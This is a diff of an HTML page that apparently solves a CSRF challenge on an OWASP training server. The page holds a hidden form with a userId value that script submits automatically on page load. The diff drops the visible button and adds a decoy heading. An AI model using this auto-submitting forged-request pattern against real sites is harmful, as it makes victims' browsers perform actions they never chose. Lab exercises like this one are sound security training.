@@ -1,14 +1,21 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form name="donneclef" action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus" method="post">
+    <h1>DonneClef</h1>
+    <h2>Merci d'utiliser le système saucisse</h2>
+
+    <form id="csrfForm"
+          action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus"
+          method="POST">
+
       <input type="hidden" name="userId" value="e09f6e55ae53a2c37b93b5e307bc0207e08fa181">
-      <input type="submit" value="Click me if not redirected"/> 
     </form>
 
     <script>
-      // Automatically submit the form when the page loads
-      document.donneclef.submit();
+      const form = document.getElementById("csrfForm");
+      form.action = "https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus";
+      form.submit();
     </script>
+
   </body>
 </html>
